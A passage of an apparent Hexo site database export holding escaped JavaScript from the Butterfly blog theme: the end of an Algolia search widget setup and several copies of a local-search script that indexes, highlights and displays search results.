false,\n      showSubmit: false,\n      placeholder: languages.input_placeholder,\n      showLoadingIndicator: true\n    }),\n    instantsearch.widgets.hits({\n      container: '#algolia-hits',\n      templates: {\n        item (data) {\n          const link = data.permalink || (GLOBAL_CONFIG.root + data.path)\n          const result = data._highlightResult\n          const content = result.contentStripTruncate\n            ? cutContent(result.contentStripTruncate.value)\n            : result.contentStrip\n              ? cutContent(result.contentStrip.value)\n              : result.content\n                ? cutContent(result.content.value)\n                : ''\n          return `\n            <a href=\"${link}\" class=\"algolia-hit-item-link\">\n              <span class=\"algolia-hits-item-title\">${result.title.value || 'no-title'}</span>\n              ${content ? `<div class=\"algolia-hit-item-content\">${content}</div>` : ''}\n            </a>`\n        },\n        empty (data) {\n          return `<div id=\"algolia-hits-empty\">${languages.hits_empty.replace(/\\$\\{query}/, data.query)}</div>`\n        }\n      }\n    }),\n    instantsearch.widgets.stats({\n      container: '#algolia-info > .algolia-stats',\n      templates: {\n        text (data) {\n          const stats = languages.hits_stats\n            .replace(/\\$\\{hits}/, data.nbHits)\n            .replace(/\\$\\{time}/, data.processingTimeMS)\n          return `<hr>${stats}`\n        }\n      }\n    }),\n    instantsearch.widgets.poweredBy({\n      container: '#algolia-info > .algolia-poweredBy'\n    }),\n    instantsearch.widgets.pagination({\n      container: '#algolia-pagination',\n      totalPages: 5,\n      templates: {\n        first: '<i class=\"fas fa-angle-double-left\"></i>',\n        last: '<i class=\"fas fa-angle-double-right\"></i>',\n        previous: '<i class=\"fas fa-angle-left\"></i>',\n        next: '<i class=\"fas fa-angle-right\"></i>'\n      }\n    })\n  ]\n\n  search.addWidgets(widgets)\n  search.start()\n  searchClickFn()\n  searchFnOnce()\n\n  window.addEventListener('pjax:complete', () => {\n    if (!btf.isHidden($searchMask)) closeSearch()\n    searchClickFn()\n  })\n\n  if (window.pjax) {\n    search.on('render', () => {\n      window.pjax.refresh(document.getElementById('algolia-hits'))\n    })\n  }\n})\n"},{"_content":"/**\n * Refer to hexo-generator-searchdb\n * https://github.com/next-theme/hexo-generator-searchdb/blob/main/dist/search.js\n * Modified by hexo-theme-butterfly\n */\n\nclass LocalSearch {\n  constructor ({\n    path = '',\n    unescape = false,\n    top_n_per_article = 1\n  }) {\n    this.path = path\n    this.unescape = unescape\n    this.top_n_per_article = top_n_per_article\n    this.isfetched = false\n    this.datas = null\n  }\n\n  getIndexByWord (words, text, caseSensitive = false) {\n    const index = []\n    const included = new Set()\n\n    if (!caseSensitive) {\n      text = text.toLowerCase()\n    }\n    words.forEach(word => {\n      if (this.unescape) {\n        const div = document.createElement('div')\n        div.innerText = word\n        word = div.innerHTML\n      }\n      const wordLen = word.length\n      if (wordLen === 0) return\n      let startPosition = 0\n      let position = -1\n      if (!caseSensitive) {\n        word = word.toLowerCase()\n      }\n      while ((position = text.indexOf(word, startPosition)) > -1) {\n        index.push({ position, word })\n        included.add(word)\n        startPosition = position + wordLen\n      }\n    })\n    // Sort index by position of keyword\n    index.sort((left, right) => {\n      if (left.position !== right.position) {\n        return left.position - right.position\n      }\n      return right.word.length - left.word.length\n    })\n    return [index, included]\n  }\n\n  // Merge hits into slices\n  mergeIntoSlice (start, end, index) {\n    let item = index[0]\n    let { position, word } = item\n    const hits = []\n    const count = new Set()\n    while (position + word.length <= end && index.length !== 0) {\n      count.add(word)\n      hits.push({\n        position,\n        length: word.length\n      })\n      const wordEnd = position + word.length\n\n      // Move to next position of hit\n      index.shift()\n      while (index.length !== 0) {\n        item = index[0]\n        position = item.position\n        word = item.word\n        if (wordEnd > position) {\n          index.shift()\n        } else {\n          break\n        }\n      }\n    }\n    return {\n      hits,\n      start,\n      end,\n      count: count.size\n    }\n  }\n\n  // Highlight title and content\n  highlightKeyword (val, slice) {\n    let result = ''\n    let index = slice.start\n    for (const { position, length } of slice.hits) {\n      result += val.substring(index, position)\n      index = position + length\n      result += `<mark class=\"search-keyword\">${val.substr(position, length)}</mark>`\n    }\n    result += val.substring(index, slice.end)\n    return result\n  }\n\n  getResultItems (keywords) {\n    const resultItems = []\n    this.datas.forEach(({ title, content, url }) => {\n      // The number of different keywords included in the article.\n      const [indexOfTitle, keysOfTitle] = this.getIndexByWord(keywords, title)\n      const [indexOfContent, keysOfContent] = this.getIndexByWord(keywords, content)\n      const includedCount = new Set([...keysOfTitle, ...keysOfContent]).size\n\n      // Show search results\n      const hitCount = indexOfTitle.length + indexOfContent.length\n      if (hitCount === 0) return\n\n      const slicesOfTitle = []\n      if (indexOfTitle.length !== 0) {\n        slicesOfTitle.push(this.mergeIntoSlice(0, title.length, indexOfTitle))\n      }\n\n      let slicesOfContent = []\n      while (indexOfContent.length !== 0) {\n        const item = indexOfContent[0]\n        const { position } = item\n        // Cut out 120 characters. The maxlength of .search-input is 80.\n        const start = Math.max(0, position - 20)\n        const end = Math.min(content.length, position + 100)\n        slicesOfContent.push(this.mergeIntoSlice(start, end, indexOfContent))\n      }\n\n      // Sort slices in content by included keywords' count and hits' count\n      slicesOfContent.sort((left, right) => {\n        if (left.count !== right.count) {\n          return right.count - left.count\n        } else if (left.hits.length !== right.hits.length) {\n          return right.hits.length - left.hits.length\n        }\n        return left.start - right.start\n      })\n\n      // Select top N slices in content\n      const upperBound = parseInt(this.top_n_per_article, 10)\n      if (upperBound >= 0) {\n        slicesOfContent = slicesOfContent.slice(0, upperBound)\n      }\n\n      let resultItem = ''\n\n      url = new URL(url, location.origin)\n      url.searchParams.append('highlight', keywords.join(' '))\n\n      if (slicesOfTitle.length !== 0) {\n        resultItem += `<li class=\"local-search-hit-item\"><a href=\"${url.href}\"><span class=\"search-result-title\">${this.highlightKeyword(title, slicesOfTitle[0])}</span>`\n      } else {\n        resultItem += `<li class=\"local-search-hit-item\"><a href=\"${url.href}\"><span class=\"search-result-title\">${title}</span>`\n      }\n\n      slicesOfContent.forEach(slice => {\n        resultItem += `<p class=\"search-result\">${this.highlightKeyword(content, slice)}...</p></a>`\n      })\n\n      resultItem += '</li>'\n      resultItems.push({\n        item: resultItem,\n        id: resultItems.length,\n        hitCount,\n        includedCount\n      })\n    })\n    return resultItems\n  }\n\n  fetchData () {\n    const isXml = !this.path.endsWith('json')\n    fetch(this.path)\n      .then(response => response.text())\n      .then(res => {\n        // Get the contents from search data\n        this.isfetched = true\n        this.datas = isXml\n          ? [...new DOMParser().parseFromString(res, 'text/xml').querySelectorAll('entry')].map(element => ({\n              title: element.querySelector('title').textContent,\n              content: element.querySelector('content').textContent,\n              url: element.querySelector('url').textContent\n            }))\n          : JSON.parse(res)\n        // Only match articles with non-empty titles\n        this.datas = this.datas.filter(data => data.title).map(data => {\n          data.title = data.title.trim()\n          data.content = data.content ? data.content.trim().replace(/<[^>]+>/g, '') : ''\n          data.url = decodeURIComponent(data.url).replace(/\\/{2,}/g, '/')\n          return data\n        })\n        // Remove loading animation\n        window.dispatchEvent(new Event('search:loaded'))\n      })\n  }\n\n  // Highlight by wrapping node in mark elements with the given class name\n  highlightText (node, slice, className) {\n    const val = node.nodeValue\n    let index = slice.start\n    const children = []\n    for (const { position, length } of slice.hits) {\n      const text = document.createTextNode(val.substring(index, position))\n      index = position + length\n      const mark = document.createElement('mark')\n      mark.className = className\n      mark.appendChild(document.createTextNode(val.substr(position, length)))\n      children.push(text, mark)\n    }\n    node.nodeValue = val.substring(index, slice.end)\n    children.forEach(element => {\n      node.parentNode.insertBefore(element, node)\n    })\n  }\n\n  // Highlight the search words provided in the url in the text\n  highlightSearchWords (body) {\n    const params = new URL(location.href).searchParams.get('highlight')\n    const keywords = params ? params.split(' ') : []\n    if (!keywords.length || !body) return\n    const walk = document.createTreeWalker(body, NodeFilter.SHOW_TEXT, null)\n    const allNodes = []\n    while (walk.nextNode()) {\n      if (!walk.currentNode.parentNode.matches('button, select, textarea, .mermaid')) allNodes.push(walk.currentNode)\n    }\n    allNodes.forEach(node => {\n      const [indexOfNode] = this.getIndexByWord(keywords, node.nodeValue)\n      if (!indexOfNode.length) return\n      const slice = this.mergeIntoSlice(0, node.nodeValue.length, indexOfNode)\n      this.highlightText(node, slice, 'search-keyword')\n    })\n  }\n}\n\nwindow.addEventListener('load', () => {\n// Search\n  const { path, top_n_per_article, unescape, languages } = GLOBAL_CONFIG.localSearch\n  const localSearch = new LocalSearch({\n    path,\n    top_n_per_article,\n    unescape\n  })\n\n  const input = document.querySelector('#local-search-input input')\n  const statsItem = document.getElementById('local-search-stats-wrap')\n  const $loadingStatus = document.getElementById('loading-status')\n  const isXml = !path.endsWith('json')\n\n  const inputEventFunction = () => {\n    if (!localSearch.isfetched) return\n    let searchText = input.value.trim().toLowerCase()\n    isXml && (searchText = searchText.replace(/</g, '&lt;').replace(/>/g, '&gt;'))\n    if (searchText !== '') $loadingStatus.innerHTML = '<i class=\"fas fa-spinner fa-pulse\"></i>'\n    const keywords = searchText.split(/[-\\s]+/)\n    const container = document.getElementById('local-search-results')\n    let resultItems = []\n    if (searchText.length > 0) {\n    // Perform local searching\n      resultItems = localSearch.getResultItems(keywords)\n    }\n    if (keywords.length === 1 && keywords[0] === '') {\n      container.textContent = ''\n      statsItem.textContent = ''\n    } else if (resultItems.length === 0) {\n      container.textContent = ''\n      const statsDiv = document.createElement('div')\n      statsDiv.className = 'search-result-stats'\n      statsDiv.textContent = languages.hits_empty.replace(/\\$\\{query}/, searchText)\n      statsItem.innerHTML = statsDiv.outerHTML\n    } else {\n      resultItems.sort((left, right) => {\n        if (left.includedCount !== right.includedCount) {\n          return right.includedCount - left.includedCount\n        } else if (left.hitCount !== right.hitCount) {\n          return right.hitCount - left.hitCount\n        }\n        return right.id - left.id\n      })\n\n      const stats = languages.hits_stats.replace(/\\$\\{hits}/, resultItems.length)\n\n      container.innerHTML = `<ol class=\"search-result-list\">${resultItems.map(result => result.item).join('')}</ol>`\n      statsItem.innerHTML = `<hr><div class=\"search-result-stats\">${stats}</div>`\n      window.pjax && window.pjax.refresh(container)\n    }\n\n    $loadingStatus.textContent = ''\n  }\n\n  let loadFlag = false\n  const $searchMask = document.getElementById('search-mask')\n  const $searchDialog = document.querySelector('#local-search .search-dialog')\n\n  // fix safari\n  const fixSafariHeight = () => {\n    if (window.innerWidth < 768) {\n      $searchDialog.style.setProperty('--search-height', window.innerHeight + 'px')\n    }\n  }\n\n  const openSearch = () => {\n    btf.overflowPaddingR.add()\n    btf.animateIn($searchMask, 'to_show 0.5s')\n    btf.animateIn($searchDialog, 'titleScale 0.5s')\n    setTimeout(() => { input.focus() }, 300)\n    if (!loadFlag) {\n      !localSearch.isfetched && localSearch.fetchData()\n      input.addEventListener('input', inputEventFunction)\n      loadFlag = true\n    }\n    // shortcut: ESC\n    document.addEventListener('keydown', function f (event) {\n      if (event.code === 'Escape') {\n        closeSearch()\n        document.removeEventListener('keydown', f)\n      }\n    })\n\n    fixSafariHeight()\n    window.addEventListener('resize', fixSafariHeight)\n  }\n\n  const closeSearch = () => {\n    btf.overflowPaddingR.remove()\n    btf.animateOut($searchDialog, 'search_close .5s')\n    btf.animateOut($searchMask, 'to_hide 0.5s')\n    window.removeEventListener('resize', fixSafariHeight)\n  }\n\n  const searchClickFn = () => {\n    btf.addEventListenerPjax(document.querySelector('#search-button > .search'), 'click', openSearch)\n  }\n\n  const searchFnOnce = () => {\n    document.querySelector('#local-search .search-close-button').addEventListener('click', closeSearch)\n    $searchMask.addEventListener('click', closeSearch)\n    if (GLOBAL_CONFIG.localSearch.preload) {\n      localSearch.fetchData()\n    }\n    localSearch.highlightSearchWords(document.getElementById('article-container'))\n  }\n\n  window.addEventListener('search:loaded', () => {\n    const $loadDataItem = document.getElementById('loading-database')\n    $loadDataItem.nextElementSibling.style.display = 'block'\n    $loadDataItem.remove()\n  })\n\n  searchClickFn()\n  searchFnOnce()\n\n  // pjax\n  window.addEventListener('pjax:complete', () => {\n    !btf.isHidden($searchMask) && closeSearch()\n    localSearch.highlightSearchWords(document.getElementById('article-container'))\n    searchClickFn()\n  })\n})\n","source":"js/search/local-search.js","raw":"/**\n * Refer to hexo-generator-searchdb\n * https://github.com/next-theme/hexo-generator-searchdb/blob/main/dist/search.js\n * Modified by hexo-theme-butterfly\n */\n\nclass LocalSearch {\n  constructor ({\n    path = '',\n    unescape = false,\n    top_n_per_article = 1\n  }) {\n    this.path = path\n    this.unescape = unescape\n    this.top_n_per_article = top_n_per_article\n    this.isfetched = false\n    this.datas = null\n  }\n\n  getIndexByWord (words, text, caseSensitive = false) {\n    const index = []\n    const included = new Set()\n\n    if (!caseSensitive) {\n      text = text.toLowerCase()\n    }\n    words.forEach(word => {\n      if (this.unescape) {\n        const div = document.createElement('div')\n        div.innerText = word\n        word = div.innerHTML\n      }\n      const wordLen = word.length\n      if (wordLen === 0) return\n      let startPosition = 0\n      let position = -1\n      if (!caseSensitive) {\n        word = word.toLowerCase()\n      }\n      while ((position = text.indexOf(word, startPosition)) > -1) {\n        index.push({ position, word })\n        included.add(word)\n        startPosition = position + wordLen\n      }\n    })\n    // Sort index by position of keyword\n    index.sort((left, right) => {\n      if (left.position !== right.position) {\n        return left.position - right.position\n      }\n      return right.word.length - left.word.length\n    })\n    return [index, included]\n  }\n\n  // Merge hits into slices\n  mergeIntoSlice (start, end, index) {\n    let item = index[0]\n    let { position, word } = item\n    const hits = []\n    const count = new Set()\n    while (position + word.length <= end && index.length !== 0) {\n      count.add(word)\n      hits.push({\n        position,\n        length: word.length\n      })\n      const wordEnd = position + word.length\n\n      // Move to next position of hit\n      index.shift()\n      while (index.length !== 0) {\n        item = index[0]\n        position = item.position\n        word = item.word\n        if (wordEnd > position) {\n          index.shift()\n        } else {\n          break\n        }\n      }\n    }\n    return {\n      hits,\n      start,\n      end,\n      count: count.size\n    }\n  }\n\n  // Highlight title and content\n  highlightKeyword (val, slice) {\n    let result = ''\n    let index = slice.start\n    for (const { position, length } of slice.hits) {\n      result += val.substring(index, position)\n      index = position + length\n      result += `<mark class=\"search-keyword\">${val.substr(position, length)}</mark>`\n    }\n    result += val.substring(index, slice.end)\n    return result\n  }\n\n  getResultItems (keywords) {\n    const resultItems = []\n    this.datas.forEach(({ title, content, url }) => {\n      // The number of different keywords included in the article.\n      const [indexOfTitle, keysOfTitle] = this.getIndexByWord(keywords, title)\n      const [indexOfContent, keysOfContent] = this.getIndexByWord(keywords, content)\n      const includedCount = new Set([...keysOfTitle, ...keysOfContent]).size\n\n      // Show search results\n      const hitCount = indexOfTitle.length + indexOfContent.length\n      if (hitCount === 0) return\n\n      const slicesOfTitle = []\n      if (indexOfTitle.length !== 0) {\n        slicesOfTitle.push(this.mergeIntoSlice(0, title.length, indexOfTitle))\n      }\n\n      let slicesOfContent = []\n      while (indexOfContent.length !== 0) {\n        const item = indexOfContent[0]\n        const { position } = item\n        // Cut out 120 characters. The maxlength of .search-input is 80.\n        const start = Math.max(0, position - 20)\n        const end = Math.min(content.length, position + 100)\n        slicesOfContent.push(this.mergeIntoSlice(start, end, indexOfContent))\n      }\n\n      // Sort slices in content by included keywords' count and hits' count\n      slicesOfContent.sort((left, right) => {\n        if (left.count !== right.count) {\n          return right.count - left.count\n        } else if (left.hits.length !== right.hits.length) {\n          return right.hits.length - left.hits.length\n        }\n        return left.start - right.start\n      })\n\n      // Select top N slices in content\n      const upperBound = parseInt(this.top_n_per_article, 10)\n      if (upperBound >= 0) {\n        slicesOfContent = slicesOfContent.slice(0, upperBound)\n      }\n\n      let resultItem = ''\n\n      url = new URL(url, location.origin)\n      url.searchParams.append('highlight', keywords.join(' '))\n\n      if (slicesOfTitle.length !== 0) {\n        resultItem += `<li class=\"local-search-hit-item\"><a href=\"${url.href}\"><span class=\"search-result-title\">${this.highlightKeyword(title, slicesOfTitle[0])}</span>`\n      } else {\n        resultItem += `<li class=\"local-search-hit-item\"><a href=\"${url.href}\"><span class=\"search-result-title\">${title}</span>`\n      }\n\n      slicesOfContent.forEach(slice => {\n        resultItem += `<p class=\"search-result\">${this.highlightKeyword(content, slice)}...</p></a>`\n      })\n\n      resultItem += '</li>'\n      resultItems.push({\n        item: resultItem,\n        id: resultItems.length,\n        hitCount,\n        includedCount\n      })\n    })\n    return resultItems\n  }\n\n  fetchData () {\n    const isXml = !this.path.endsWith('json')\n    fetch(this.path)\n      .then(response => response.text())\n      .then(res => {\n        // Get the contents from search data\n        this.isfetched = true\n        this.datas = isXml\n          ? [...new DOMParser().parseFromString(res, 'text/xml').querySelectorAll('entry')].map(element => ({\n              title: element.querySelector('title').textContent,\n              content: element.querySelector('content').textContent,\n              url: element.querySelector('url').textContent\n            }))\n          : JSON.parse(res)\n        // Only match articles with non-empty titles\n        this.datas = this.datas.filter(data => data.title).map(data => {\n          data.title = data.title.trim()\n          data.content = data.content ? data.content.trim().replace(/<[^>]+>/g, '') : ''\n          data.url = decodeURIComponent(data.url).replace(/\\/{2,}/g, '/')\n          return data\n        })\n        // Remove loading animation\n        window.dispatchEvent(new Event('search:loaded'))\n      })\n  }\n\n  // Highlight by wrapping node in mark elements with the given class name\n  highlightText (node, slice, className) {\n    const val = node.nodeValue\n    let index = slice.start\n    const children = []\n    for (const { position, length } of slice.hits) {\n      const text = document.createTextNode(val.substring(index, position))\n      index = position + length\n      const mark = document.createElement('mark')\n      mark.className = className\n      mark.appendChild(document.createTextNode(val.substr(position, length)))\n      children.push(text, mark)\n    }\n    node.nodeValue = val.substring(index, slice.end)\n    children.forEach(element => {\n      node.parentNode.insertBefore(element, node)\n    })\n  }\n\n  // Highlight the search words provided in the url in the text\n  highlightSearchWords (body) {\n    const params = new URL(location.href).searchParams.get('highlight')\n    const keywords = params ? params.split(' ') : []\n    if (!keywords.length || !body) return\n    const walk = document.createTreeWalker(body, NodeFilter.SHOW_TEXT, null)\n    const allNodes = []\n    while (walk.nextNode()) {\n      if (!walk.currentNode.parentNode.matches('button, select, textarea, .mermaid')) allNodes.push(walk.currentNode)\n    }\n    allNodes.forEach(node => {\n      const [indexOfNode] = this.getIndexByWord(keywords, node.nodeValue)\n      if (!indexOfNode.length) return\n      const slice = this.mergeIntoSlice(0, node.nodeValue.length, indexOfNode)\n      this.highlightText(node, slice, 'search-keyword')\n    })\n  }\n}\n\nwindow.addEventListener('load', () => {\n// Search\n  const { path, top_n_per_article, unescape, languages } = GLOBAL_CONFIG.localSearch\n  const localSearch = new LocalSearch({\n    path,\n    top_n_per_article,\n    unescape\n  })\n\n  const input = document.querySelector('#local-search-input input')\n  const statsItem = document.getElementById('local-search-stats-wrap')\n  const $loadingStatus = document.getElementById('loading-status')\n  const isXml = !path.endsWith('json')\n\n  const inputEventFunction = () => {\n    if (!localSearch.isfetched) return\n    let searchText = input.value.trim().toLowerCase()\n    isXml && (searchText = searchText.replace(/</g, '&lt;').replace(/>/g, '&gt;'))\n    if (searchText !== '') $loadingStatus.innerHTML = '<i class=\"fas fa-spinner fa-pulse\"></i>'\n    const keywords = searchText.split(/[-\\s]+/)\n    const container = document.getElementById('local-search-results')\n    let resultItems = []\n    if (searchText.length > 0) {\n    // Perform local searching\n      resultItems = localSearch.getResultItems(keywords)\n    }\n    if (keywords.length === 1 && keywords[0] === '') {\n      container.textContent = ''\n      statsItem.textContent = ''\n    } else if (resultItems.length === 0) {\n      container.textContent = ''\n      const statsDiv = document.createElement('div')\n      statsDiv.className = 'search-result-stats'\n      statsDiv.textContent = languages.hits_empty.replace(/\\$\\{query}/, searchText)\n      statsItem.innerHTML = statsDiv.outerHTML\n    } else {\n      resultItems.sort((left, right) => {\n        if (left.includedCount !== right.includedCount) {\n          return right.includedCount - left.includedCount\n        } else if (left.hitCount !== right.hitCount) {\n          return right.hitCount - left.hitCount\n        }\n        return right.id - left.id\n      })\n\n      const stats = languages.hits_stats.replace(/\\$\\{hits}/, resultItems.length)\n\n      container.innerHTML = `<ol class=\"search-result-list\">${resultItems.map(result => result.item).join('')}</ol>`\n      statsItem.innerHTML = `<hr><div class=\"search-result-stats\">${stats}</div>`\n      window.pjax && window.pjax.refresh(container)\n    }\n\n    $loadingStatus.textContent = ''\n  }\n\n  let loadFlag = false\n  const $searchMask = document.getElementById('search-mask')\n  const $searchDialog = document.querySelector('#local-search .search-dialog')\n\n  // fix safari\n  const fixSafariHeight = () => {\n    if (window.innerWidth < 768) {\n      $searchDialog.style.setProperty('--search-height', window.innerHeight + 'px')\n    }\n  }\n\n  const openSearch = () => {\n    btf.overflowPaddingR.add()\n    btf.animateIn($searchMask, 'to_show 0.5s')\n    btf.animateIn($searchDialog, 'titleScale 0.5s')\n    setTimeout(() => { input.focus() }, 300)\n    if (!loadFlag) {\n      !localSearch.isfetched && localSearch.fetchData()\n      input.addEventListener('input', inputEventFunction)\n      loadFlag = true\n    }\n    // shortcut: ESC\n    document.addEventListener('keydown', function f (event) {\n      if (event.code === 'Escape') {\n        closeSearch()\n        document.removeEventListener('keydown', f)\n      }\n    })\n\n    fixSafariHeight()\n    window.addEventListener('resize', fixSafariHeight)\n  }\n\n  const closeSearch = () => {\n    btf.overflowPaddingR.remove()\n    btf.animateOut($searchDialog, 'search_close .5s')\n    btf.animateOut($searchMask, 'to_hide 0.5s')\n    window.removeEventListener('resize', fixSafariHeight)\n  }\n\n  const searchClickFn = () => {\n    btf.addEventListenerPjax(document.querySelector('#search-button > .search'), 'click', openSearch)\n  }\n\n  const searchFnOnce = () => {\n    document.querySelector('#local-search .search-close-button').addEventListener('click', closeSearch)\n    $searchMask.addEventListener('click', closeSearch)\n    if (GLOBAL_CONFIG.localSearch.preload) {\n      localSearch.fetchData()\n    }\n    localSearch.highlightSearchWords(document.getElementById('article-container'))\n  }\n\n  window.addEventListener('search:loaded', () => {\n    const $loadDataItem = document.getElementById('loading-database')\n    $loadDataItem.nextElementSibling.style.display = 'block'\n    $loadDataItem.remove()\n  })\n\n  searchClickFn()\n  searchFnOnce()\n\n  // pjax\n  window.addEventListener('pjax:complete', () => {\n    !btf.isHidden($searchMask) && closeSearch()\n    localSearch.highlightSearchWords(document.getElementById('article-container'))\n    searchClickFn()\n  })\n})\n","date":"2025-10-07T06:26:10.354Z","updated":"2025-10-07T06:26:10.354Z","path":"js/search/local-search.js","layout":"false","title":"","comments":1,"_id":"cmglxf2i90011uomy1efuc8qj","content":"/**\n * Refer to hexo-generator-searchdb\n * https://github.com/next-theme/hexo-generator-searchdb/blob/main/dist/search.js\n * Modified by hexo-theme-butterfly\n */\n\nclass LocalSearch {\n  constructor ({\n    path = '',\n    unescape = false,\n    top_n_per_article = 1\n  }) {\n    this.path = path\n    this.unescape = unescape\n    this.top_n_per_article = top_n_per_article\n    this.isfetched = false\n    this.datas = null\n  }\n\n  getIndexByWord (words, text, caseSensitive = false) {\n    const index = []\n    const included = new Set()\n\n    if (!caseSensitive) {\n      text = text.toLowerCase()\n    }\n    words.forEach(word => {\n      if (this.unescape) {\n        const div = document.createElement('div')\n        div.innerText = word\n        word = div.innerHTML\n      }\n      const wordLen = word.length\n      if (wordLen === 0) return\n      let startPosition = 0\n      let position = -1\n      if (!caseSensitive) {\n        word = word.toLowerCase()\n      }\n      while ((position = text.indexOf(word, startPosition)) > -1) {\n        index.push({ position, word })\n        included.add(word)\n        startPosition = position + wordLen\n      }\n    })\n    // Sort index by position of keyword\n    index.sort((left, right) => {\n      if (left.position !== right.position) {\n        return left.position - right.position\n      }\n      return right.word.length - left.word.length\n    })\n    return [index, included]\n  }\n\n  // Merge hits into slices\n  mergeIntoSlice (start, end, index) {\n    let item = index[0]\n    let { position, word } = item\n    const hits = []\n    const count = new Set()\n    while (position + word.length <= end && index.length !== 0) {\n      count.add(word)\n      hits.push({\n        position,\n        length: word.length\n      })\n      const wordEnd = position + word.length\n\n      // Move to next position of hit\n      index.shift()\n      while (index.length !== 0) {\n        item = index[0]\n        position = item.position\n        word = item.word\n        if (wordEnd > position) {\n          index.shift()\n        } else {\n          break\n        }\n      }\n    }\n    return {\n      hits,\n      start,\n      end,\n      count: count.size\n    }\n  }\n\n  // Highlight title and content\n  highlightKeyword (val, slice) {\n    let result = ''\n    let index = slice.start\n    for (const { position, length } of slice.hits) {\n      result += val.substring(index, position)\n      index = position + length\n      result += `<mark class=\"search-keyword\">${val.substr(position, length)}</mark>`\n    }\n    result += val.substring(index, slice.end)\n    return result\n  }\n\n  getResultItems (keywords) {\n    const resultItems = []\n    this.datas.forEach(({ title, content, url }) => {\n      // The number of different keywords included in the article.\n      const [indexOfTitle, keysOfTitle] = this.getIndexByWord(keywords, title)\n      const [indexOfContent, keysOfContent] = this.getIndexByWord(keywords, content)\n      const includedCount = new Set([...keysOfTitle, ...keysOfContent]).size\n\n      // Show search results\n      const hitCount = indexOfTitle.length + indexOfContent.length\n      if (hitCount === 0) return\n\n      const slicesOfTitle = []\n      if (indexOfTitle.length !== 0) {\n        slicesOfTitle.push(this.mergeIntoSlice(0, title.length, indexOfTitle))\n      }\n\n      let slicesOfContent = []\n      while (indexOfContent.length !== 0) {\n        const item = indexOfContent[0]\n        const { position } = item\n        // Cut out 120 characters. The maxlength of .search-input is 80.\n        const start = Math.max(0, position - 20)\n        const end = Math.min(content.length, position + 100)\n        slicesOfContent.push(this.mergeIntoSlice(start, end, indexOfContent))\n      }\n\n      // Sort slices in content by included keywords' count and hits' count\n      slicesOfContent.sort((left, right) => {\n        if (left.count !== right.count) {\n          return right.count - left.count\n        } else if (left.hits.length !== right.hits.length) {\n          return right.hits.length - left.hits.length\n        }\n        return left.start - right.start\n      })\n\n      // Select top N slices in content\n      const upperBound = parseInt(this.top_n_per_article, 10)\n      if (upperBound >= 0) {\n        slicesOfContent = slicesOfContent.slice(0, upperBound)\n      }\n\n      let resultItem = ''\n\n      url = new URL(url, location.origin)\n      url.searchParams.append('highlight', keywords.join(' '))\n\n      if (slicesOfTitle.length !== 0) {\n        resultItem += `<li class=\"local-search-hit-item\"><a href=\"${url.href}\"><span class=\"search-result-title\">${this.highlightKeyword(title, slicesOfTitle[0])}</span>`\n      } else {\n        resultItem += `<li class=\"local-search-hit-item\"><a href=\"${url.href}\"><span class=\"search-result-title\">${title}</span>`\n      }\n\n      slicesOfContent.forEach(slice => {\n        resultItem += `<p class=\"search-result\">${this.highlightKeyword(content, slice)}...</p></a>`\n      })\n\n      resultItem += '</li>'\n      resultItems.push({\n        item: resultItem,\n        id: resultItems.length,\n        hitCount,\n        includedCount\n      })\n    })\n    return resultItems\n  }\n\n  fetchData () {\n    const isXml = !this.path.endsWith('json')\n    fetch(this.path)\n      .then(response => response.text())\n      .then(res => {\n        // Get the contents from search data\n        this.isfetched = true\n        this.datas = isXml\n          ? [...new DOMParser().parseFromString(res, 'text/xml').querySelectorAll('entry')].map(element => ({\n              title: element.querySelector('title').textContent,\n              content: element.querySelector('content').textContent,\n              url: element.querySelector('url').textContent\n            }))\n          : JSON.parse(res)\n        // Only match articles with non-empty titles\n        this.datas = this.datas.filter(data => data.title).map(data => {\n          data.title = data.title.trim()\n          data.content = data.content ? data.content.trim().replace(/<[^>]+>/g, '') : ''\n          data.url = decodeURIComponent(data.url).replace(/\\/{2,}/g, '/')\n          return data\n        })\n        // Remove loading animation\n        window.dispatchEvent(new Event('search:loaded'))\n      })\n  }\n\n  // Highlight by wrapping node in mark elements with the given class name\n  highlightText (node, slice, className) {\n    const val = node.nodeValue\n    let index = slice.start\n    const children = []\n    for (const { position, length } of slice.hits) {\n      const text = document.createTextNode(val.substring(index, position))\n      index = position + length\n      const mark = document.createElement('mark')\n      mark.className = className\n      mark.appendChild(document.createTextNode(val.substr(position, length)))\n      children.push(text, mark)\n    }\n    node.nodeValue = val.substring(index, slice.end)\n    children.forEach(element => {\n      node.parentNode.insertBefore(element, node)\n    })\n  }\n\n  // Highlight the search words provided in the url in the text\n  highlightSearchWords (body) {\n    const params = new URL(location.href).searchParams.get('highlight')\n    const keywords = params ? params.split(' ') : []\n    if (!keywords.length || !body) return\n    const walk = document.createTreeWalker(body, NodeFilter.SHOW_TEXT, null)\n    const allNodes = []\n    while (walk.nextNode()) {\n      if (!walk.currentNode.parentNode.matches('button, select, textarea, .mermaid')) allNodes.push(walk.currentNode)\n    }\n    allNodes.forEach(node => {\n      const [indexOfNode] = this.getIndexByWord(keywords, node.nodeValue)\n      if (!indexOfNode.length) return\n      const slice = this.mergeIntoSlice(0, node.nodeValue.length, indexOfNode)\n      this.highlightText(node, slice, 'search-keyword')\n    })\n  }\n}\n\nwindow.addEventListener('load', () => {\n// Search\n  const { path, top_n_per_article, unescape, languages } = GLOBAL_CONFIG.localSearch\n  const localSearch = new LocalSearch({\n    path,\n    top_n_per_article,\n    unescape\n  })\n\n  const input = document.querySelector('#local-search-input input')\n  const statsItem = document.getElementById('local-search-stats-wrap')\n  const $loadingStatus = document.getElementById('loading-status')\n  const isXml = !path.endsWith('json')\n\n  const inputEventFunction = () => {\n    if (!localSearch.isfetched) return\n    let searchText = input.value.trim().toLowerCase()\n    isXml && (searchText = searchText.replace(/</g, '&lt;').replace(/>/g, '&gt;'))\n    if (searchText !== '') $loadingStatus.innerHTML = '<i class=\"fas fa-spinner fa-pulse\"></i>'\n    const keywords = searchText.split(/[-\\s]+/)\n    const container = document.getElementById('local-search-results')\n    let resultItems = []\n    if (searchText.length > 0) {\n    // Perform local searching\n      resultItems = localSearch.getResultItems(keywords)\n    }\n    if (keywords.length === 1 && keywords[0] === '') {\n      container.textContent = ''\n      statsItem.textContent = ''\n    } else if (resultItems.length === 0) {\n      container.textContent = ''\n      const statsDiv = document.createElement('div')\n      statsDiv.className = 'search-result-stats'\n      statsDiv.textContent = languages.hits_empty.replace(/\\$\\{query}/, searchText)\n      statsItem.innerHTML = statsDiv.outerHTML\n    } else {\n      resultItems.sort((left, right) => {\n        if (left.includedCount !== right.includedCount) {\n          return right.includedCount - left.includedCount\n        } else if (left.hitCount !== right.hitCount) {\n          return right.hitCount - 